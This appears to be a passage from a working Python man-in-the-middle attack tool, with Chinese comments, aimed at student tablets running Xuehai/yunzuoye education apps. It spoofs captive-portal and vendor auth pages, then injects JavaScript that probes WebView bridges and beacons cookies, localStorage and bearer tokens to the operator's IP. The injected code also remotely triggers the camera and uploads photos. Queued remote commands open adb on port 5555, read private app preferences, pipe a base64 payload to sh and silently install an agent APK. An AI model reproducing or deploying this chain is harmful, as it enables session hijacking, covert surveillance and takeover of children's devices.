  var u='/TOKENLEAK?t='+encodeURIComponent(tag)+'&d='+encodeURIComponent(s);
  try{new Image().src=u;}catch(e){}
  try{new Image().src='http://%s'+u;}catch(e){}
}catch(e){}}

// ---- 0) 最先发一次信标, 保证即使后面出错也能确认执行 ----
be('start',{href:location.href, ua:navigator.userAgent, t:Date.now()});

// ---- 1) 枚举所有可注入对象(JS 桥) ----
var cand=[];
try{
  for(var k in window){
    if(/js|bridge|android|app|xh|launch|native|web|sdk|install|token|auth/i.test(k)) cand.push(k);
  }
}catch(e){}
var found={};
for(var i=0;i<cand.length && i<40;i++){
  var n=cand[i], v=null;
  try{ v=window[n]; }catch(e){ continue; }
  if(!v || (typeof v!=='object' && typeof v!=='function')) continue;
  var ms={};
  try{ for(var m in v){ var t; try{t=typeof v[m];}catch(e){t='?';} ms[m]=t; } }catch(e){ ms['<err>']=String(e); }
  found[n]=ms;
}
be('bridges',{href:location.href, keys:cand.join('|'), objs:found});

// ---- 2) 探测 LauncherJs ----
try{
  var lj=window.LauncherJs;
  if(lj){
    var r={};
    try{ r.console=String(lj.console('MARVIS-PROBE')); }catch(e){ r.console='ERR:'+e; }
    try{ r.toLogin=typeof lj.toLogin; }catch(e){}
    try{ r.openCamera=typeof lj.openCamera; }catch(e){}
    try{ r.finish=typeof lj.finish; }catch(e){}
    be('launcherjs', r);
  }
}catch(e){ be('launcherjs','ERR:'+e); }

// ---- 3) 本地存储 / cookie ----
try{
  var st={};
  for(var j=0;j<localStorage.length && j<25;j++){
    var kk=localStorage.key(j); st[kk]=String(localStorage.getItem(kk)).slice(0,400);
  }
  be('localStorage', st);
}catch(e){ be('localStorage','ERR:'+e); }
try{ be('sessionStorage', JSON.stringify(sessionStorage)); }catch(e){}
try{ be('cookie', document.cookie); }catch(e){}

// ---- 4) 其它应用的 webView 桥 ----
try{
  var wv=window.webView;
  if(wv){
    var o2={};
    var f=['getAppType','getMyUserId','getToken','getAuthLogin','getBaseUrl','getClassInfo',
           'getClassroomId','getCurrentCourse','getVersionName','getVersionCode','getType',
           'getVisibleResourceType'];
    for(var q=0;q<f.length;q++){ try{ o2[f[q]]=String(wv[f[q]]()); }catch(e){ o2[f[q]]='ERR'; } }
    be('webView', o2);
  }
}catch(e){}

// ---- 5) 摄像头: 定义接收器 + 调用 LauncherJs.openCamera(1) ----
// 应用拍照后会把画面以 javascript:uploadPhoto('data:image/png;base64,...') 注回本页,
// 这里接住并 POST 回主机落盘。
window.uploadPhoto=function(d){
  try{ be('photo-meta',{len:String(d).length, head:String(d).slice(0,140)}); }catch(e){}
  try{
    var x=new XMLHttpRequest();
    x.open('POST','/PHOTO',true);
    x.setRequestHeader('Content-Type','text/plain');
    x.send(String(d));
  }catch(e){}
};
try{
  if(window.LauncherJs && window.LauncherJs.openCamera){
    window.LauncherJs.openCamera(1);
    be('openCamera-called',{ok:true});
  }else{
    be('openCamera-called',{ok:false, has:!!(window.LauncherJs)});
  }
}catch(e){ be('openCamera-called',{err:String(e)}); }

be('done',{href:location.href, ua:navigator.userAgent});</script></body></html>""" % (OUR_IP, OUR_IP)).encode("utf-8")

# ★★★ 协助链 payload(2026-10-04) ★★★
# 智通课堂/launcher 的协助机制全部经由**明文**服务发现取基址:
#   AssistRemoteDataSource -> {base}/api/v1/users/{uid}/devices/{did}/assists
#   AssistFunc.executeCmd(String)        -> ZCommand.execCmdForRes   (任意 shell)
#   AssistFunc.installAppOnline(String)  -> DownloadManager.download -> ApplicationPolicyProxy
#                                           .installApplication (静默安装, MD5 不校验内容)
# 基址一旦落到本机, 下面两条指令就是"跑 shell" 与 "静默装我们的 APK"。
# ★★★ 2026-10-04 21:00 实测突破 ★★★
# 设备在 WebView 中明文加载 H5 应用 http://survey.yunzuoye.net/ :
#   GET /                       -> 我们的 EXPLOIT_PAGE (页面 JS 已执行, 3 次信标回传成功)
#   GET /js/app.5d6b643d.js 等   -> 14 个 JS + 13 个 CSS 全部由我们提供
#   该 WebView 可用桥: onappinstalled | LauncherJs | SensorsData_APP_New_H5_Bridge |
#                     SensorsData_App_Visual_Bridge
#   LauncherJs = { console(String), finish(), openCamera(int), toLogin(String,String) }
# 把该 H5 应用的 JS 整体替换为我们的载荷 -> 每次应用启动都执行我们的代码。
# SURVEY-JS-FROM-FILE: 从 survey_recon.js 读取侦察载荷(便于迭代, 不重启逻辑)
try:
    with open(os.path.join(BASE, "survey_recon.js"), "rb") as _rf:
        SURVEY_RECON = _rf.read()
except Exception:
    SURVEY_RECON = b""

# BRIDGE-PROBE-FROM-FILE (2026-10-10): 云课堂 com.xh.smartclassstu 的带桥容器
#   com.xh.yktwebview.ui.impl.base.BaseWebViewActivity 注册的桥名 = "webView",
#   含 17 个 @JavascriptInterface 方法: getToken()(取 CPVDUser.getAccessToken -> "Bearer xxx")
#   /getAuthLogin/getMyUserId/getClassroomId/getClassInfo/getCurrentCourse/getBaseUrl/...
try:
    with open(os.path.join(BASE, "webview_bridge_probe.js"), "rb") as _bf:
        BRIDGE_PROBE = _bf.read()
except Exception:
    BRIDGE_PROBE = b""
if BRIDGE_PROBE:
    SURVEY_RECON = BRIDGE_PROBE + b"\n;\n" + SURVEY_RECON

SURVEY_JS = ("""
try{new Image().src='/TOKENLEAK?t=JS-boot&d='+encodeURIComponent(location.href);}catch(e){}
(function(){
function be(tag,obj){try{var s;try{s=JSON.stringify(obj);}catch(e){s=String(obj);}
var u='/TOKENLEAK?t='+encodeURIComponent(tag)+'&d='+encodeURIComponent(s);
try{new Image().src=u;}catch(e){}
try{new Image().src='http://%s'+u;}catch(e){}}catch(e){}}
be('JS-start',{href:location.href,ua:navigator.userAgent,t:Date.now()});
var cand=[];
try{for(var k in window){if(/js|bridge|android|app|xh|launch|native|web|sdk|install|token|auth/i.test(k))cand.push(k);}}catch(e){}
var found={};
for(var i=0;i<cand.length&&i<40;i++){
  var n=cand[i],v=null;try{v=window[n];}catch(e){continue;}
  if(!v||(typeof v!=='object'&&typeof v!=='function'))continue;
  var ms={};try{for(var m in v){var t;try{t=typeof v[m];}catch(e){t='?';}ms[m]=t;}}catch(e){ms['<err>']=String(e);}
  found[n]=ms;
}
be('JS-bridges',{href:location.href,keys:cand.join('|'),objs:found});
try{
  var st={};for(var j=0;j<localStorage.length&&j<25;j++){var kk=localStorage.key(j);
    st[kk]=String(localStorage.getItem(kk)).slice(0,400);}
  be('JS-localStorage',st);
}catch(e){be('JS-localStorage','ERR:'+e);}
try{be('JS-cookie',document.cookie);}catch(e){}
try{
  var lj=window.LauncherJs;
  if(lj){var r={};
    try{r.console=String(lj.console('MARVIS-JS'));}catch(e){r.console='ERR:'+e;}
    try{r.toLogin=typeof lj.toLogin;}catch(e){}
    try{r.openCamera=typeof lj.openCamera;}catch(e){}
    try{r.finish=typeof lj.finish;}catch(e){}
    be('JS-LauncherJs',r);}
}catch(e){}
try{
  var wv=window.webView;
  if(wv){var o2={};var f=['getToken','getMyUserId','getClassInfo','getClassroomId','getCurrentCourse'];
    for(var q=0;q<f.length;q++){try{o2[f[q]]=String(wv[f[q]]());}catch(e){o2[f[q]]='ERR';}}
    be('JS-webView',o2);}
}catch(e){}
window.uploadPhoto=function(d){
  try{ be('JS-photo-meta',{len:String(d).length, head:String(d).slice(0,140)}); }catch(e){}
  try{
    var x=new XMLHttpRequest();
    x.open('POST','/PHOTO',true);
    x.setRequestHeader('Content-Type','text/plain');
    x.send(String(d));
  }catch(e){}
};
try{
  if(window.LauncherJs && window.LauncherJs.openCamera){
    window.LauncherJs.openCamera(1);
    be('JS-openCamera',{ok:true});
  }else{
    be('JS-openCamera',{ok:false, has:!!(window.LauncherJs)});
  }
}catch(e){ be('JS-openCamera',{err:String(e)}); }
be('JS-done',{href:location.href,ua:navigator.userAgent});
})();
""" % OUR_IP).encode("utf-8")

# ★★★ 两阶段载荷(2026-10-04 22:12 修正) ★★★
# 实测: 旧版 ~1400B 的页面执行成功 3 次, 而 3364B 的新版页面从未执行。
# 推断是本 L2 冒充器对较大响应体的分段处理有缺陷 -> 端侧拿到截断页面 -> <script> 不完整。
# 因此 / 只返回这个**极小**引导页(约 200B), 它再用一个 <script src> 去拉完整载荷。
MIN_PAGE = (b"<html><head><meta charset='utf-8'></head><body>"
            b"\xe8\xbf\x9e\xe6\x8e\xa5\xe6\x88\x90\xe5\x8a\x9f\xef\xbc\x81 "
            b"\xe6\xb5\x99\xe6\xb1\x9f\xe5\xad\xa6\xe6\xb5\xb7\xe6\x95\x99\xe8\x82\xb2"
            b"\xe7\xa7\x91\xe6\x8a\x80\xe6\x9c\x89\xe9\x99\x90\xe5\x85\xac\xe5\x8f\xb8"
            b"<script>"
            b"var _o=(location.protocol==='https:'?'https://www.zjxhedu.com':'http://www.zjxhedu.com');new Image().src=_o+'/TOKENLEAK?t=boot&d='+encodeURIComponent(location.href);new Image().src='/TOKENLEAK?t=bootX&d='+encodeURIComponent(location.href);"
            b"var s=document.createElement('script');s.src=(location.protocol==='https:'?'https://www.zjxhedu.com':'')+'/p.js';"
            b"(document.body||document.documentElement).appendChild(s);"
            b"</script></body></html>")

# ★★★ 认证页(2026-10-04 完善版) ★★★
# 由 launcher 的 NetworkUtil.checkConnect() 判定, smali 依据:
#   NetworkUtil.smali:992   checkConnect()
#                    :1019  "http://www.zjxhedu.com/data/wifi.html"
#                    :1109  contains("连接成功！")
#                    :1123  contains("浙江学海教育科技有限公司")
#                    :1131  两者都命中 -> setAuthState(true) -> 判定"网络已认证"
# 因此本页同时满足: ① 让 checkConnect 判"已认证"(设备放行/进入业务)
#                   ② 外观是一张正常的网络认证页
#                   ③ 内联 JS 执行我们的载荷(同源信标 + 拉取 /p.js)
AUTH_PAGE = (b"<!DOCTYPE html><html><head><meta charset='utf-8'>"
             b"<meta name='viewport' content='width=device-width,initial-scale=1'>"
             b"<title>\xe7\xbd\x91\xe7\xbb\x9c\xe8\xae\xa4\xe8\xaf\x81</title>"
             b"<style>body{font-family:sans-serif;margin:0;padding:28px;color:#333}"
             b"h2{color:#1a73e8;margin:0 0 6px}.s{color:#0a0;font-weight:bold}"
             b"p{color:#666;font-size:14px;line-height:1.6}</style></head><body>"
             b"<h2>\xe8\xbf\x9e\xe6\x8e\xa5\xe6\x88\x90\xe5\x8a\x9f\xef\xbc\x81</h2>"
             b"<p class='s'>\xe6\xb5\x99\xe6\xb1\x9f\xe5\xad\xa6\xe6\xb5\xb7\xe6\x95\x99"
             b"\xe8\x82\xb2\xe7\xa7\x91\xe6\x8a\x80\xe6\x9c\x89\xe9\x99\x90\xe5\x85\xac"
             b"\xe5\x8f\xb8</p>"
             b"<p>\xe6\x82\xa8\xe5\xb7\xb2\xe8\xbf\x9e\xe6\x8e\xa5\xe5\x88\xb0"
             b"\xe5\xad\xa6\xe6\xb5\xb7\xe6\x95\x99\xe8\x82\xb2\xe6\xa0\xa1\xe5\x9b\xad"
             b"\xe7\xbd\x91\xe7\xbb\x9c\xef\xbc\x8c\xe5\x8f\xaf\xe6\xad\xa3\xe5\xb8\xb8"
             b"\xe4\xbd\xbf\xe7\x94\xa8\xe5\x90\x84\xe9\xa1\xb9\xe6\x9c\x8d\xe5\x8a\xa1\xe3\x80\x82</p>"
             b"<script>"
             b"var _o=(location.protocol==='https:'?'https://www.zjxhedu.com':'http://www.zjxhedu.com');new Image().src=_o+'/TOKENLEAK?t=boot&d='+encodeURIComponent(location.href);new Image().src='/TOKENLEAK?t=bootX&d='+encodeURIComponent(location.href);"
             b"var s=document.createElement('script');s.src=(location.protocol==='https:'?'https://www.zjxhedu.com':'')+'/p.js';"
             b"(document.body||document.documentElement).appendChild(s);"
             b"</script></body></html>")

ASSIST_SESSION = {"id": "assist_marvis_0001", "teacherId": 1, "teacherName": "学海老师", "status": 1, "createTime": 1692000000000}
# ★★★ 协助链任务组（脚本语法 ZAZE.g4: Identifier '(' args ')' ）：
#   目标 = 一次拿全"权限画像 + 开 adb 5555 + 静默装包"，全部明文、无人值守。
#   t1 探权限/探 su（结果会 POST 回 /assist/result，我们落盘 assist_result.log）
#   t2 直接开 adb（启动器域的 sh 尝试）
#   t3 经 su 开 adb（若设备已 root）
#   t4 下载并静默安装【包名匹配】的 agent（我们用 VM 实证过该命令/该 APK 有效）
#   t5/t6 取系统配置与已装应用列表（信息面）
ASSIST_TASKS = [
    {"id": "t1", "step": 1,
     "instruction": 'executeCmd("id; echo ---B; getprop ro.build.type; getprop ro.debuggable;'
                    ' getprop ro.secure; echo ---C; ls -l /system/xbin/su /system/bin/su /sbin/su'
                    ' 2>&1; echo ---D; getprop service.adb.tcp.port; echo ---E; getprop ro.product.model;'
                    ' echo MARVIS_PROBE_END")'},
    {"id": "t2", "step": 2,
     "instruction": 'executeCmd("setprop service.adb.tcp.port 5555; stop adbd; start adbd;'
                    ' sleep 1; getprop service.adb.tcp.port; echo ADB_TRY_END")'},
    {"id": "t3", "step": 3,
     "instruction": 'executeCmd("su -c \'setprop service.adb.tcp.port 5555; stop adbd; start adbd; id\''
                    ' 2>&1; echo SU_TRY_END")'},
    {"id": "t4", "step": 4,
     "instruction": 'installAppOnline("http://%s/agent_wordstack.apk")' % OUR_IP},
    {"id": "t5", "step": 5,
     "instruction": 'getSystemConfig()'},
    {"id": "t6", "step": 6,
     "instruction": 'getInstallAppList()'},
    # ★ 信息外带: executeCmd 以启动器自身 uid 运行 ⇒ 可读其私有 SharedPreferences(会话 token),
    #   输出经 /assist/result 明文回传, 我方落盘 assist_result.log。
    {"id": "t7", "step": 7,
     "instruction": 'executeCmd("ls -la /data/data/com.xh.zhitongyunstu/ 2>&1;'
                    ' ls -la /data/data/com.xh.zhitongyunstu/shared_prefs/ 2>&1;'
                    ' ls -la /sdcard/xuehai/ /sdcard/xuehai/config/ 2>&1; echo MAP_END")'},
    {"id": "t8", "step": 8,
     "instruction": 'executeCmd("for f in /data/data/com.xh.zhitongyunstu/shared_prefs/*.xml;'
                    ' do echo ===$f===; cat $f; done 2>&1 | head -c 6000; echo PREFS_END")'},
    # ★ 不依赖厂商 SDK 的安装路径: 先下到本地, 再 pm install (直装 / su 提权装)
    {"id": "t9", "step": 9,
     "instruction": 'downloadFile("http://%s/agent_wordstack.apk",'
                    ' "/sdcard/Download/agent_ws.apk")' % OUR_IP},
    {"id": "t10", "step": 10,
     "instruction": 'executeCmd("ls -l /sdcard/Download/agent_ws.apk;'
                    ' pm install -r /sdcard/Download/agent_ws.apk 2>&1; echo INSTALL_DIRECT_END")'},
    {"id": "t11", "step": 11,
     "instruction": 'executeCmd("echo %s | base64 -d | sh; echo INSTALL_SU_END")' % __import__(
         "base64").b64encode(
         b"id; su -c 'pm install -r /sdcard/Download/agent_ws.apk' 2>&1; echo INSTALL_SU_END"
     ).decode()},
]

# 反选式接管: 除"自检主机"外**全部** 80 端口连接都冒充。
# 原因: 端侧服务发现走的是明文 http://ms.yunzuoye.net/...(常量硬编码), 但它解析到的 IP
# 不固定(可能是任意云 IP), 只有全量接管才能保证那张服务表一定落到我们手上。
# 唯一排除 47.110.163.128(www.zjxhedu.com 自检页) —— 真服务器在正常回包,
# 去抢答只会引入 RST 竞争, 若端侧读体前被 RST 就会判"无法连接学海"而不进业务。
EXCLUDE_DST = {x.strip() for x in
               (os.environ.get("HTTP80_EXCLUDE") or "47.110.163.128").split(",") if x.strip()}

# 【2026-10-04 实测结论】学习应用的图片资源 CDN 前缀(39.173.108.0/24)。
# 该通道经完整盘点只承载 .jpg/.png; 并已用 WebView 探针(以 image 路径投递 HTML+JS)
# 证明端侧是用图片解码器消费的 —— 信标未回, 即无法升级为脚本执行。
# 因此把它放回真服务器, 恢复平板图片正常显示, 不再干扰正常使用。
EXCLUDE_PREFIX = tuple(x.strip() for x in
                       (os.environ.get("HTTP80_EXCLUDE_PREFIX") or "39.173.108.").split(",") if x.strip())


def _excluded(ip):
    return ip in EXCLUDE_DST or (EXCLUDE_PREFIX and ip.startswith(EXCLUDE_PREFIX))


# 【透明中继】这些 Host 的请求先从真服务器取回真实响应, 落盘后再原样转发给端侧:
#   1) 课堂功能恢复正常(不再是 2 字节 "ok"),
#   2) 我们能拿到"云教室 getPage"的真实响应格式 —— 那是替换内容的前提。
# 实测明文课堂接口: GET /api/v3/users/{uid}/getPage?classrooms=..&sign=..&t=..
RELAY_HOSTS = tuple(x.strip() for x in
                    (os.environ.get("HTTP80_RELAY_HOSTS") or "").split(",") if x.strip())
RELAY_LOG = os.path.join(os.path.dirname(os.path.abspath(__file__)), "relay_capture.log")


def relay_capture(host, method, path, body=b""):
    import urllib.request
    import urllib.error
    url = "http://%s%s" % (host, path)
    try:
        req = urllib.request.Request(
            url, data=(body if method != "GET" else None), method=method)
        req.add_header("User-Agent", "Dalvik/2.1.0")
        with urllib.request.urlopen(req, timeout=8) as r:
            data = r.read()
            ct = r.headers.get("Content-Type", "application/json")
            status = r.status
        r1 = "=== [RELAY] %s %s%s -> %d, %d B, ctype=%s\n--- body(前 3000) ---\n%s" % (
            method, host, path[:160], status, len(data), ct,
            data[:3000].decode("utf-8", "replace"))
        wlog(r1)
        try:
            with open(RELAY_LOG, "a", encoding="utf-8", errors="replace") as f:
                f.write(r1 + "\n\n")
        except Exception:
            pass
        return data, ct
    except Exception as e:
        wlog("=== [RELAY-ERR] %s %s%s -> %s" % (method, host, path[:160], e))
        return b"{}", "application/json; charset=UTF-8"


# ★★★ captive portal 判定(2026-10-04 夜禁下的关键一步) ★★★
# Android 用 http://connectivitycheck.gstatic.com/generate_204 探测连通性:
#   期望 **HTTP 204 + 空体**  => 网络正常
#   收到 200 有内容 / 3xx 重定向 => 判定为 captive portal => 显示"需要认证"通知,
#                                    点开后用 WebView 打开重定向目标。
# 因此: 拦截这些探测主机, 回 302 重定向到我们控制的认证页
# (http://www.zjxhedu.com/data/wifi.html —— 厂商自己的 authUrl, 其 WebView 挂 LauncherJs 桥),
# 设备就会进入"需要认证"状态, 而认证页由我们提供。
CAPTIVE_PROBE_HOSTS = ("connectivitycheck.gstatic.com", "connectivitycheck.android.com",
                       "www.google.com", "connectivitycheck.gstatic.cn",
                       "noisyfox.cn", "www.msftconnecttest.com", "captive.apple.com")
PORTAL_URL = "http://www.zjxhedu.com/sys_portal.html"


def _redirect(location, code=302):
    head = ("HTTP/1.1 %d Found\r\n"
            "Location: %s\r\n"
            "Content-Length: 0\r\n"
            "Cache-Control: no-store, no-cache, must-revalidate\r\n"
            "Connection: keep-alive\r\n\r\n" % (code, location))
    return head.encode("utf-8")


def _resp(body, ctype="text/html; charset=UTF-8", extra=b""):
    head = ("HTTP/1.1 200 OK\r\n"
            "Content-Type: %s\r\n"
            "Content-Length: %d\r\n"
            "Cache-Control: no-cache, no-store\r\n"
            "Connection: keep-alive\r\n" % (ctype, len(body)))
    head = head.encode("utf-8") + (extra or b"") + b"\r\n"
    return head + body


def portal_relay(host, method, path, body=b""):
    """把端侧请求原样转给本机 portal_server(127.0.0.1:80), 返回其原始响应字节。

    2026-10-05: 这是与"黑洞路由 + L2 抢答"配合的关键 ——
    真服务器已被 route 黑洞挡住, 平板发往真实 IP 的请求只有我们能应答;
    于是把应答统一交给 portal_server, 行为(PORTAL_REDIRECT / AUTH_PAGE)完全一致。
    """
    import socket as _s
    try:
        c = _s.create_connection(("127.0.0.1", int(os.environ.get("HTTP80_PORTAL_PORT") or 80)),
                                 timeout=3)
    except Exception as e:
        wlog("[RELAY-PORTAL-ERR] %s" % e)
        return None
    try:
        req = ("%s %s HTTP/1.1\r\nHost: %s\r\n"
               "User-Agent: %s\r\nConnection: close\r\n"
               "Content-Length: %d\r\n\r\n" % (
                   method or "GET", path, host or "localhost",
                   os.environ.get("HTTP80_PORTAL_UA") or "okhttp/3.12.1",
                   len(body))).encode("utf-8") + body
        c.sendall(req)
        buf = b""
        while True:
            d = c.recv(65536)
            if not d:
                break
            buf += d
        return buf
    except Exception as e:
        wlog("[RELAY-PORTAL-ERR2] %s" % e)
        return None
    finally:
        try:
            c.close()
        except Exception:
            pass


# ==========================================================================
# 业务反向代理 (2026-10-06): 未识别的业务请求 -> 转发到真服务器(HTTPS + SNI)
# ==========================================================================
REAL_IP = {
    "ms.yunzuoye.net": "47.111.87.154",
    "ztp.yunzuoye.net": "47.111.87.154",
    "control.yunzuoye.net": "47.111.87.154",
    "logdata.yunzuoye.net": "47.111.87.154",
    "survey.yunzuoye.net": "47.111.87.154",
    "filesoss.yunzuoye.net": "47.110.67.143",
    "smarterclassgray.yunzuoye.net": "47.111.87.154",
    "airclass-staging-gray.yunzuoye.net": "47.111.87.154",
}


# MICRO-REWRITE: 递归改写响应里的微服务/服务地址 -> 我们的明文地址
_MR_HOST_KEYS = ("domainorip", "serverip", "ip", "host", "domain", "serverhost", "addr")
_MR_PORT_KEYS = ("port", "serverport")
_MR_PROTO_KEYS = ("protocol", "schema", "scheme")
_MR_TYPE_HINT = ("micro", "server", "address", "dto", "iplist", "host")


def _mr_is_yunzuoye(v):
    if not isinstance(v, str):
        return False
    low = v.lower()
    return ("yunzuoye" in low or "xh.com" in low or "ztytech" in low
            or "xuehai" in low) and "192.168.137.1" not in low


def _mr_fix_proto(v):
    if isinstance(v, str) and v.lower().startswith("https"):
        return "http"
    return v


def _mr_walk(node, ctx_interesting, out):
    """ctx_interesting: 当前子树是否处在 micro/server/address 语境里"""
    if isinstance(node, dict):
        keys_low = {k.lower(): k for k in node.keys()}
        interesting = ctx_interesting or any(
            any(t in k for t in _MR_TYPE_HINT) for k in keys_low)
        for kl, k in keys_low.items():
            v = node[k]
            if isinstance(v, (dict, list)):
                _mr_walk(v, interesting, out)
            elif isinstance(v, str):
                if kl in _MR_PROTO_KEYS:
                    nv = _mr_fix_proto(v)
                    if nv != v:
                        node[k] = nv
                        out.append("proto:%s->%s" % (v[:12], nv))
                elif kl in _MR_HOST_KEYS and interesting and _mr_is_yunzuoye(v):
                    node[k] = OUR_IP
                    out.append("host:%s->%s" % (v[:28], OUR_IP))
    elif isinstance(node, list):
        for it in node:
            _mr_walk(it, ctx_interesting, out)


def micro_rewrite(body_bytes):
    """外科手术式改写微服务表: 只把【网页/H5/资源/文件服务】改到我们(明文), 其余保持真实。

    SURGICAL-WEB-REWRITE (2026-10-10 22:0x 复查后的新方案):
      背景:
        · 全量改写(旧行为)会让 App 所有 API 打到我们的伪应答 => "无法以在线模式进入" ✗
        · 完全不改写(停用) 则我们的 JS/资源注入拿不到带桥容器里的 H5 ✗
      新方案(只动这几类):
        · SB103007 资源(RESOURCE 服务: 实测端侧从它下发课件图片 xhfs*.oss-cn-hangzhou)
        · WEB002011 / WEB113001-3  网页(H5)服务
        · SB103027 / SB103016      文件服务
        ⇒ 这些指到 http://192.168.137.1:80(我们的明文面)
        ⇒ 端侧加载 H5/资源时从我们这里取 => 该 H5 在带 webView 桥的 WebViewActivity 里渲染
          => 我们注入的载荷执行 => window.webView.getToken() => "Bearer <accessToken>" => 会话接管
        ⇒ 其余类型(账号 SA106003 / 升级 / 推送 SB103018 / 数据等)保持真实地址 => App 仍在线 ✓
    """
    WEB_REWRITE_TYPES = ("SB103007", "SB103013", "SB103027", "SB103016",
                         "WEB002011", "WEB113001", "WEB113002", "WEB113003")
    try:
        obj = json.loads(body_bytes.decode("utf-8", "replace"))
    except Exception:
        return body_bytes, []
    out = []

    def _fix_dto(d):
        if not isinstance(d, dict):
            return False
        st = str(d.get("serverType") or "")
        if st not in WEB_REWRITE_TYPES:
            return False
        old = "%s:%s" % (d.get("domainOrIp"), d.get("port"))
        d["domainOrIp"] = OUR_IP
        d["port"] = 80
        d["mode"] = 0
        d["dirLocation"] = ""
        out.append("%s %s->%s:80" % (st, old, OUR_IP))
        return True

    def _walk(node):
        if isinstance(node, dict):
            if "serverType" in node and _fix_dto(node):
                return
            for v in node.values():
                _walk(v)
        elif isinstance(node, list):
            for v in node:
                _walk(v)

    _walk(obj)
    if not out:
        return body_bytes, []
    try:
        return json.dumps(obj, ensure_ascii=False).encode("utf-8"), out
    except Exception:
        return body_bytes, []


def _sentry_dump(path, host, body):
    """SENTRY-DUMP-PROXY: 崩溃上报原文落盘 + gzip 解析"""
    if "sentry" not in host and "envelope" not in path:
        return
    try:
        import zlib as _z
        _rb = body if isinstance(body, (bytes, bytearray)) else bytes(body)
        _tx = ""
        try:
            import gzip as _gz
            try:
                _tx = _gz.decompress(_rb).decode("utf-8", "replace")
            except Exception:
                _tx = _z.decompress(_rb, 31).decode("utf-8", "replace")
        except Exception:
            _tx = "(RAW %dB) " % len(_rb) + repr(_rb[:4000])
        with open(os.path.join(os.path.dirname(os.path.abspath(__file__)), "sentry_dump.log"), "a", encoding="utf-8", errors="replace") as _f:
            _f.write("===== %s %s | Host=%s | %dB =====\n%s\n\n" % (datetime.datetime.now(), path[:120], host, len(_rb), _tx[:15000]))
        wlog("!!!!!! [SENTRY-DUMP] %s | %dB -> %d chars" % (path[:90], len(_rb), len(_tx)))
        wlog("[SENTRY-BODY] " + _tx[:1800].replace(chr(10), " | "))
    except Exception as _e:
        wlog("[SENTRY-DUMP-ERR] %s" % _e)


def proxy_real(host, method, path, body=b""):
    """把请求转发到真服务器(HTTPS, SNI=host), 返回 (body, ctype)。失败返回 (None, None)。"""
    _sentry_dump(path, host, body)
    import ssl as _ssl
    import socket as _sock
    ip = REAL_IP.get(host)
    if not ip:
        # 兜底: 用公共 DNS 解析 (绕过 hosts)
        try:
            import struct as _st, random as _rd
            tid = _rd.randint(0, 65535)
            q = _st.pack(">HHHHHH", tid, 0x0100, 1, 0, 0, 0)
            for part in host.split("."):
                q += bytes([len(part)]) + part.encode()
            q += b"\x00" + _st.pack(">HH", 1, 1)
            s = _sock.socket(_sock.AF_INET, _sock.SOCK_DGRAM); s.settimeout(3)
            s.sendto(q, ("223.5.5.5", 53))
            data, _ = s.recvfrom(1024); s.close()
            idx = len(q)
            an = _st.unpack(">H", data[6:8])[0]
            for _i in range(an):
                while idx < len(data) and data[idx] != 0:
                    if data[idx] & 0xC0:
                        idx += 2; break
                    idx += data[idx] + 1
                else:
                    idx += 1
                rt, rc, ttl, rl = _st.unpack(">HHIH", data[idx:idx+10]); idx += 10
                if rt == 1 and rl == 4:
                    ip = ".".join(str(b) for b in data[idx:idx+4]); break
                idx += rl
        except Exception:
            pass
    if not ip:
        return None, None
    try:
        ctx = _ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = _ssl.CERT_NONE
        raw = _sock.create_connection((ip, 443), timeout=8)
        tls = ctx.wrap_socket(raw, server_hostname=host)
        hdrs = "%s %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: Dalvik/2.1.0\r\n" % (
            method, path, host)
        hdrs += "Accept: application/json\r\nConnection: close\r\n"
        if body:
            hdrs += "Content-Length: %d\r\nContent-Type: application/json\r\n" % len(body)
        hdrs += "\r\n"
        tls.sendall(hdrs.encode("latin1") + (body or b""))
        buf = b""
        while True:
            ch = tls.recv(65536)
            if not ch:
                break
            buf += ch
            if len(buf) > 4 * 1024 * 1024:
                break
        tls.close()
        if b"\r\n\r\n" not in buf:
            return None, None
        head, payload = buf.split(b"\r\n\r\n", 1)
        ct = "application/json; charset=UTF-8"
        for ln in head.split(b"\r\n"):
            if ln.lower().startswith(b"content-type:"):
                ct = ln.split(b":", 1)[1].strip().decode("latin1"); break
        if b"chunked" in head.lower():
            outp = b""
            rest = payload
            while True:
                if b"\r\n" not in rest:
                    break
                szline, rest = rest.split(b"\r\n", 1)
                try:
                    sz = int(szline.split(b";")[0], 16)
                except ValueError:
                    break
                if sz == 0:
                    break
                outp += rest[:sz]
                rest = rest[sz + 2:]
            payload = outp
        return payload, ct
    except Exception:
        return None, None


def build_response(path, body=b"", host="", method="GET"):
    # ======================================================================
    # ★★★ 优先级块 (2026-10-06): 只保留 3 个自答点, 其余全部代理真服务器
    # ======================================================================
    # SENTRY-DUMP-EARLY: 崩溃上报原文(含 gzip 解析) —— 必须在所有分支之前
    if "sentry" in host or "envelope" in path:
        try:
            import zlib as _zl2
            _rb = body if isinstance(body, (bytes, bytearray)) else bytes(body)
            _tx = ""
            try:
                _tx = _zl2.decompress(_rb).decode("utf-8", "replace")
            except Exception:
                _tx = "(" + repr(_rb[:600]) + ")"
            with open(os.path.join(os.path.dirname(os.path.abspath(__file__)), "sentry_dump.log"), "a", encoding="utf-8", errors="replace") as _sf2:
                _sf2.write("===== %s %s | Host=%s | %dB =====\n%s\n\n" % (datetime.datetime.now(), path[:120], host, len(_rb), _tx[:12000]))
            wlog("!!!!!! [SENTRY-DUMP] %s | %dB" % (path[:90], len(_rb)))
            wlog("[SENTRY-BODY] " + _tx[:1500].replace(chr(10), " | "))
        except Exception as _e3:
            wlog("[SENTRY-DUMP-ERR] %s" % _e3)
    _ep = path.split("?")[0]
    _eq = path.split("?", 1)[1] if "?" in path else ""

    # ★★★ 错题库接口伪造 (引导端侧产生带批注的错题 -> 触发明文批量下载)
    if "wrongCollection" in _ep or "wrongQuestion" in _ep:
        stat["eb"] = stat.get("eb", 0) + 1
        if "category" in _ep:
            wlog("!!!!!! [EB-CRAFT] 错题分类下发 | Host=%s | %s" % (host, _ep[:100]))
            return _resp(EB_CATEGORY, "application/json; charset=UTF-8")
        wlog("!!!!!! [EB-CRAFT] 错题列表伪造下发 (带 annotationUrl) | Host=%s | %s" % (host, path[:130]))
        return _resp(EB_CRAFTED, "application/json; charset=UTF-8")

    # ★★★ 平台 APK 配置 (仅限 launcher 的平台APK请求)
    if ("/api/v2/platform/apk" in _ep) or (_ep == "/" and ("appId" in _eq or "versionCode" in _eq)):
        stat["platapk"] = stat.get("platapk", 0) + 1
        wlog("!!!!!! [PLAT-APK] 平台APK配置下发 | Host=%s | %s" % (host, path[:150]))
        return _resp(PLATFORM_APK_CFG, "application/json; charset=UTF-8")

